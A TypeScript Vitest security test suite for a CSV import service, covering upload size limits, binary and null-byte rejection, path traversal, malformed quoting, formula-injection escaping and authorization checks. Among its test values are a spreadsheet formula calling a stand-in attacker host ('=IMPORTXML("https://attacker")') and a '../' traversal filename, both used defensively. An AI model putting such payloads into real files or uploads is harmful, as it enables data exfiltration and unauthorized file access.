import { randomUUID } from 'node:crypto';

import { AllowAllMalwareScanPort, LocalPrivateObjectStorage } from '@adp/platform';
import { describe, expect, it } from 'vitest';

import {
  ImportCommitService,
  ImportReportService,
  ImportUploadService,
  OrganizationMergeService,
  sanitizeReportCell,
  validateCsvArtifact,
} from '../index.js';
import type { MergePlan } from '../index.js';
import {
  InMemoryBatchRepo,
  InMemoryDuplicateRepo,
  InMemoryEvidencePort,
  InMemoryMergeEventRepo,
  InMemoryMergeReadRepo,
  InMemoryMergeWritePort,
  InMemoryOrgPort,
  InMemoryRowRepo,
  InMemoryConsentPort,
  InMemoryVariablePort,
  mergeSnapshot,
  researcher,
  sales,
} from './support/fakes.js';

const limits = { maxBytes: 32, maxRows: 5, maxColumns: 5, maxCellBytes: 20 };

describe('collection security coverage', () => {
  it('rejects oversized uploads before storage mutations', async () => {
    const storage = new LocalPrivateObjectStorage(`/tmp/adp-collection-security-${randomUUID()}`);
    const batches = new InMemoryBatchRepo();
    const rows = new InMemoryRowRepo();

    await expect(
      new ImportUploadService(batches, rows, storage, new AllowAllMalwareScanPort(), limits).upload(
        {
          actor: researcher,
          filename: 'large.csv',
          contentType: 'text/csv',
          bytes: new TextEncoder().encode(`Company\n${'x'.repeat(64)}\n`),
          idempotencyKey: 'oversized',
        },
      ),
    ).rejects.toThrow(/maximum size/);
    expect(batches.batches.size).toBe(0);
    expect(rows.rows).toHaveLength(0);
  });

  it('rejects binary disguised as CSV, null bytes, path traversal, and malformed quoting', () => {
    expect(() =>
      validateCsvArtifact({
        filename: 'payload.csv',
        contentType: 'text/csv',
        bytes: new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8, 65, 66, 67]),
        limits: { ...limits, maxBytes: 100 },
      }),
    ).toThrow(/binary/);
    expect(() =>
      validateCsvArtifact({
        filename: 'payload.csv',
        contentType: 'text/csv',
        bytes: new Uint8Array([67, 111, 109, 0, 112, 97, 110, 121]),
        limits: { ...limits, maxBytes: 100 },
      }),
    ).toThrow(/null bytes/);
    expect(() =>
      validateCsvArtifact({
        filename: '../payload.csv',
        contentType: 'text/csv',
        bytes: new TextEncoder().encode('Company\nAcme\n'),
        limits: { ...limits, maxBytes: 100 },
      }),
    ).toThrow(/path separators/);
    expect(() =>
      validateCsvArtifact({
        filename: 'payload.csv',
        contentType: 'text/csv',
        bytes: new TextEncoder().encode('Company\n"unterminated\n'),
        limits: { ...limits, maxBytes: 100 },
      }),
    ).toThrow(/malformed quotes/);
  });

  it('escapes formula injection in reports without changing persisted raw rows', async () => {
    const batches = new InMemoryBatchRepo();
    const rows = new InMemoryRowRepo();
    const duplicates = new InMemoryDuplicateRepo();
    const batch = await batches.create({
      originalFilename: 'formulas.csv',
      storageKey: 'imports/formulas/formulas.csv',
      contentType: 'text/csv',
      contentHash: 'hash',
      fileSizeBytes: 20,
      delimiter: ',',
      idempotencyKey: 'formulas',
      rowCount: 1,
      createdByUserId: null,
    });
    await rows.insertMany([
      {
        batchId: batch.id,
        rowNumber: 2,
        raw: { Company: '=IMPORTXML("https://attacker")', Email: '@cmd' },
        mapped: { 'organization.display_name': '+SUM(1,1)' },
        normalized: { 'organization.display_name': 'SUM HOA' },
        status: 'valid',
        errors: [],
        createdOrganizationId: null,
        createdContactId: null,
        createdLocationId: null,
      },
    ]);

    const report = await new ImportReportService(batches, rows, duplicates).getReport({
      actor: sales,
      batchId: batch.id,
    });
    expect(report.rows[0]?.raw.Company).toBe('\'=IMPORTXML("https://attacker")');
    expect(report.rows[0]?.raw.Email).toBe("'@cmd");
    expect(report.rows[0]?.mapped['organization.display_name']).toBe("'+SUM(1,1)");
    expect(sanitizeReportCell('-10')).toBe("'-10");
    expect((await rows.listByBatch(batch.id))[0]?.raw.Company).toBe(
      '=IMPORTXML("https://attacker")',
    );
  });

  it('denies unauthorized raw-row reports, commits, and merge approval', async () => {
    const batches = new InMemoryBatchRepo();
    const rows = new InMemoryRowRepo();
    const duplicates = new InMemoryDuplicateRepo();
    const batch = await batches.create({
      originalFilename: 'auth.csv',
      storageKey: 'imports/auth/auth.csv',
      contentType: 'text/csv',
      contentHash: 'hash',
      fileSizeBytes: 10,
      delimiter: ',',
      idempotencyKey: 'auth',
      rowCount: 0,
      createdByUserId: null,
    });

    await expect(
      new ImportReportService(batches, rows, duplicates).getReport({
        actor: { userId: null, roles: [] },
        batchId: batch.id,
      }),
    ).rejects.toThrow(/not authorized/);
    await expect(
      new ImportCommitService(
        batches,
        rows,
        duplicates,
        new InMemoryOrgPort(),
        new InMemoryEvidencePort(),
        new InMemoryVariablePort(),
        new InMemoryConsentPort(),
      ).commit({ actor: sales, batchId: batch.id, idempotencyKey: 'auth-commit' }),
    ).rejects.toThrow(/not authorized/);

    const mergeEvents = new InMemoryMergeEventRepo();
    const merge = new OrganizationMergeService(
      new InMemoryMergeReadRepo([mergeSnapshot('survivor'), mergeSnapshot('duplicate')]),
      mergeEvents,
      new InMemoryMergeWritePort(),
    );
    const preview = await merge.preview({
      actor: researcher,
      survivorOrganizationId: 'survivor',
      duplicateOrganizationIds: ['duplicate'],
      idempotencyKey: 'auth-merge',
    });
    await expect(
      merge.approve({
        actor: sales,
        mergeEventId: preview.id,
        plan: preview.plan as MergePlan,
      }),
    ).rejects.toThrow(/not authorized/);
  });
});
